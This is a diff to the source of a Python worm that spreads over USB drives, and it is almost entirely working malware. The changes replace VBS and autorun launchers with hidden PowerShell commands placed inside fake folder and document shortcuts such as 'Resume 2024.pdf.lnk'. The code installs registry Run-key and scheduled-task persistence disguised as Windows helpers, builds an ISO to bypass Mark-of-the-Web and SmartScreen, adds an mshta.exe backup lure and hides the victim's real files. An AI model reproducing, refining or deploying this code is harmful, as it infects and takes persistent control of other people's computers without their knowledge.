@@ -313,57 +313,67 @@ def _removable():
     except: pass
     return drives
 
-def _make_fast_deploy_win(usb_py, usb_drive):
+def _make_ps_deploy_cmd(usb_py, usb_drive):
     """
-    Create a VBS fast-deploy script on the USB.
-    Goal: copy worm to victim disk + install 3 persistence methods in < 1 second.
-    Called by LNK lures as the first-stage launcher.
-    Even if USB is yanked immediately after, worm is already on disk + persisted.
+    Build a powershell.exe inline -Command argument string.
+    Goal: copy worm to AppData + 3 persistence methods + launch + open Explorer.
+    This is the LNK target argument on modern Windows 10/11 — no VBS in chain.
     """
-    # Destination on victim machine (temp + appdata)
-    vbs = f"""' Fast deploy — {AID}
-Set sh = CreateObject("WScript.Shell")
-Set fs = CreateObject("Scripting.FileSystemObject")
+    apd  = r"%APPDATA%\Microsoft\Windows\SystemCache"
+    inst = apd + r"\update.py"
+    # Single-line PS command (will be the LNK Arguments field)
+    cmd = (
+        "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command \""
+        f"$apd=[System.Environment]::ExpandEnvironmentVariables('{apd}');"
+        f"$inst=[System.Environment]::ExpandEnvironmentVariables('{inst}');"
+        "New-Item -ItemType Directory -Path $apd -Force|Out-Null;"
+        f"Copy-Item '{usb_py}' $inst -Force;"
+        "(Get-Item $inst -Force).Attributes='Hidden';"
+        "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'"
+        " -Name 'WinSysHelper' -Value \"pythonw `\"$inst`\"\" -Force;"
+        "schtasks /create /tn WinDefenderHelper"
+        " /tr \"pythonw `\"$inst`\"\" /sc onlogon /rl highest /f 2>$null;"
+        "Start-Process pythonw -ArgumentList \"`\"$inst`\"\" -WindowStyle Hidden;"
+        f"Start-Process explorer '{usb_drive}'\""
+    )
+    return cmd
 
-tmp   = sh.ExpandEnvironmentStrings("%TEMP%") & "\\wupd.py"
-apd   = sh.ExpandEnvironmentStrings("%APPDATA%") & "\\Microsoft\\Windows\\SystemCache"
-inst  = apd & "\\update.py"
-
-' Step 1: Copy to TEMP immediately (survives USB removal)
-On Error Resume Next
-fs.CopyFile "{usb_py}", tmp, True
-
-' Step 2: Copy to hidden AppData location
-If Not fs.FolderExists(apd) Then fs.CreateFolder(apd)
-fs.CopyFile tmp, inst, True
-sh.Run "cmd /c attrib +h +s """ & inst & """", 0, False
-
-' Step 3: Persist — Registry Run key (instant, no UAC)
-sh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSysHelper", _
-            "pythonw """ & inst & """", "REG_SZ"
-
-' Step 4: Persist — Scheduled Task (survives user logout)
-sh.Run "schtasks /create /tn WinDefenderHelper /tr " & Chr(34) & "pythonw """ & inst & """" & Chr(34) & " /sc onlogon /rl highest /f", 0, False
-
-' Step 5: Persist — Startup folder BAT
-sf = sh.ExpandEnvironmentStrings("%APPDATA%") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wshelper.bat"
-Dim fOut : Set fOut = fs.CreateTextFile(sf, True)
-fOut.WriteLine "@echo off"
-fOut.WriteLine "start /b """" pythonw """ & inst & """"
-fOut.Close
-
-' Step 6: Launch immediately
-sh.Run "pythonw """ & inst & """", 0, False
-
-' Step 7: Open Explorer so user sees drive contents normally
-sh.Run "explorer """ & usb_drive & """", 1, False
-"""
-    vbs_path = os.path.join(os.path.dirname(usb_py), "_deploy.vbs")
+def _make_usb_iso(usb_py, usb_drive, iso_out):
+    """
+    Build an ISO container holding a copy of the agent + LNK lures.
+    Files inside a mounted ISO have no Mark-of-the-Web — SmartScreen won't warn.
+    Uses mkisofs/genisoimage on the build machine (operator side, not victim).
+    Called from start script's payload baking, not from the agent itself.
+    """
     try:
-        open(vbs_path,"w").write(vbs)
-        subprocess.run(["attrib","+h","+s",vbs_path],capture_output=True)
+        import tempfile, shutil as _sh2
+        stage = tempfile.mkdtemp(prefix=".iso_stage_")
+        # Copy agent into ISO
+        shutil.copy2(usb_py, os.path.join(stage, "update.py"))
+        # Build LNK lures inside ISO (relative paths — powershell runs from mounted vol)
+        ps_exe = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+        lures = [
+            ("Documents.lnk",     "shell32.dll", 4),
+            ("Photos.lnk",        "imageres.dll",108),
+            ("Backup.lnk",        "shell32.dll", 4),
+            ("Resume 2024.pdf.lnk","shell32.dll",70),
+        ]
+        cmd = ("-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass"
+               r" -File update.py")
+        for lname, idll, iidx in lures:
+            _make_lnk(os.path.join(stage, lname), ps_exe, cmd,
+                      icon_path=f"%SystemRoot%\\system32\\{idll}",
+                      icon_idx=iidx, show_cmd=7)
+        # Build ISO
+        tool = shutil.which("mkisofs") or shutil.which("genisoimage")
+        if tool:
+            r = subprocess.run([tool,"-quiet","-o",iso_out,stage],
+                               capture_output=True)
+            _sh2.rmtree(stage, ignore_errors=True)
+            return r.returncode == 0
+        _sh2.rmtree(stage, ignore_errors=True)
     except: pass
-    return vbs_path
+    return False
 
 def _make_fast_deploy_linux(usb_py, usb_drive):
     """
@@ -428,32 +438,30 @@ def _spread_usb(drive):
             _timestomp(dst)
             for f in [hdir,dst]: subprocess.run(["attrib","+h","+s",f],capture_output=True)
 
-            # ── Fast-deploy VBS (runs INSTANTLY on first click, USB-safe) ───
-            vbs_path = _make_fast_deploy_win(dst, drive)
+            # ── LNK lures → powershell.exe inline (primary modern vector) ───
+            # No VBS/wscript in the chain — autorun.inf dead since Win7 SP1
+            _drop_usb_lures_win(drive, dst)
 
-            # ── autorun.inf — points to VBS (even faster than python) ────────
-            ar=os.path.join(drive,"autorun.inf")
-            open(ar,"w").write(
-                f"[AutoRun]\nopen=wscript.exe \"{vbs_path}\"\n"
-                f"shellexecute=wscript.exe \"{vbs_path}\"\nlabel=USB Drive\nicon=shell32.dll,8\n")
-            subprocess.run(["attrib","+h","+s",ar],capture_output=True)
+            # ── ISO container — MOTW bypass ──────────────────────────────────
+            # Files inside a mounted ISO have no Mark-of-the-Web
+            iso_out = os.path.join(drive, "Drive_Backup.iso")
+            _make_usb_iso(dst, drive, iso_out)
 
-            # ── HTA launcher (backup, also instant) ─────────────────────────
-            hta=os.path.join(drive,"Setup.hta")
-            open(hta,"w").write(
-                f'<HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" CAPTION="no">'
-                f'<script language="VBScript">Sub Window_OnLoad\n'
-                f'CreateObject("WScript.Shell").Run "wscript.exe ""{vbs_path}""",0,False\n'
-                f'window.close\nEnd Sub</script><body></body></HTA>')
-
-            # ── Folder-icon LNK lures — now point to VBS, not python ────────
-            _drop_usb_lures_win(drive, vbs_path)
+            # ── mshta.exe lure — backup execution method ─────────────────────
+            ps_deploy = _make_ps_deploy_cmd(dst, drive)
+            ps_exe = r"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
+            mshta_lnk = os.path.join(drive, "Setup.lnk")
+            mshta_exe = r"%SystemRoot%\System32\mshta.exe"
+            _make_lnk(mshta_lnk, mshta_exe,
+                      f'vbscript:Execute("CreateObject(""WScript.Shell"").Run ""{ps_exe} {ps_deploy}"",0:close")',
+                      icon_path=r"%SystemRoot%\system32\shell32.dll",
+                      icon_idx=8, show_cmd=7)
 
             # ── Hide existing real files so lures are only visible items ─────
             try:
                 for item in os.listdir(drive):
                     fp=os.path.join(drive,item)
-                    if not item.endswith(".lnk") and item not in ("desktop.ini","autorun.inf"):
+                    if not item.endswith(".lnk") and item not in ("desktop.ini","Drive_Backup.iso"):
                         subprocess.run(["attrib","+h",fp],capture_output=True)
             except: pass
 
@@ -580,49 +588,38 @@ def _make_lnk(lnk_path, target_path, args="", icon_path=None, icon_idx=0, show_c
         return True
     except: return False
 
-def _drop_usb_lures_win(drive, vbs_path):
+def _drop_usb_lures_win(drive, usb_py):
     """
-    Drop convincing lures on the USB root (Windows).
-    All lures launch the VBS fast-deploy → copies to disk + 3 persistence methods
-    + opens Explorer so victim sees normal drive contents.
+    Drop LNK lures on the USB root targeting powershell.exe directly.
+    No VBS/wscript in the execution chain (autorun.inf dead since Win7 SP1,
+    wscript.exe flagged by Defender on removable media on Win10/11).
 
     Lure types:
-      *.lnk   — folder-icon shortcuts (most clicked)
-      *.scr   — screensaver (auto-executes on some systems, bypasses some AVs)
-      *.hta   — HTA backup (works when wscript disabled)
-    desktop.ini makes the drive look like a System/Documents folder in Explorer.
+      Folder-icon .lnk  — most clicked, look like directories
+      Fake-doc .lnk     — Resume.pdf / Invoice.xlsx icons, high click rate
+    LNK → powershell.exe -WindowStyle Hidden -Command [inline deploy]
+    desktop.ini → drive appears as Documents system folder in Explorer
     """
-    # LNK lures — each looks like a folder, silently runs VBS
+    ps_exe  = r"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
+    ps_args = _make_ps_deploy_cmd(usb_py, drive)
+
     lures = [
-        ("Documents.lnk",        r"%SystemRoot%\system32\shell32.dll",    3),
-        ("Pictures.lnk",         r"%SystemRoot%\system32\imageres.dll",  108),
-        ("Important Files.lnk",  r"%SystemRoot%\system32\shell32.dll",    3),
-        ("Work Files.lnk",       r"%SystemRoot%\system32\shell32.dll",    3),
-        ("Backup.lnk",           r"%SystemRoot%\system32\shell32.dll",    4),
-        ("Resume.lnk",           r"%SystemRoot%\system32\shell32.dll",   70),
+        # (filename,                icon_dll,               icon_idx)
+        ("Documents.lnk",           r"%SystemRoot%\system32\shell32.dll",    4),
+        ("Photos.lnk",              r"%SystemRoot%\system32\imageres.dll", 108),
+        ("Important Files.lnk",     r"%SystemRoot%\system32\shell32.dll",    4),
+        ("Work Files.lnk",          r"%SystemRoot%\system32\shell32.dll",    4),
+        ("Backup.lnk",              r"%SystemRoot%\system32\shell32.dll",    4),
+        ("Resume 2024.pdf.lnk",     r"%SystemRoot%\system32\shell32.dll",   70),
+        ("Invoice_March.xlsx.lnk",  r"%SystemRoot%\system32\shell32.dll",   70),
     ]
     for name, icon_dll, icon_idx in lures:
         lnk_path = os.path.join(drive, name)
         if not os.path.exists(lnk_path):
-            _make_lnk(
-                lnk_path,
-                target_path=r"%SystemRoot%\system32\wscript.exe",
-                args=f'"{vbs_path}"',
-                icon_path=icon_dll,
-                icon_idx=icon_idx,
-                show_cmd=7   # SW_SHOWMINNOACTIVE — window never appears
-            )
+            _make_lnk(lnk_path, ps_exe, ps_args,
+                      icon_path=icon_dll, icon_idx=icon_idx, show_cmd=7)
 
-    # .scr screensaver lure — copy of the VBS, renamed .scr
-    # On some systems right-click → Install/Run executes it directly
-    scr_path = os.path.join(drive, "SlideShow.scr")
-    try:
-        shutil.copy2(vbs_path, scr_path)
-        subprocess.run(["attrib","+h",scr_path], capture_output=True)
-    except: pass
-
-    # desktop.ini — makes drive appear as "Documents" system folder in Explorer
-    # CLSID2 = My Documents shell folder; suppresses "this might be dangerous" prompts
+    # desktop.ini — drive appears as Documents system folder in Explorer
     ini = os.path.join(drive, "desktop.ini")
     try:
         open(ini,"w").write(
@@ -634,7 +631,6 @@ def _drop_usb_lures_win(drive, vbs_path):
             "[ViewState]\r\nMode=\r\nVid=\r\nFolderType=Documents\r\n"
         )
         subprocess.run(["attrib","+h","+s",ini], capture_output=True)
-        # Mark drive itself as System so Explorer shows the custom icon
         subprocess.run(["attrib","+r","+s",drive.rstrip("\\")], capture_output=True)
     except: pass
 
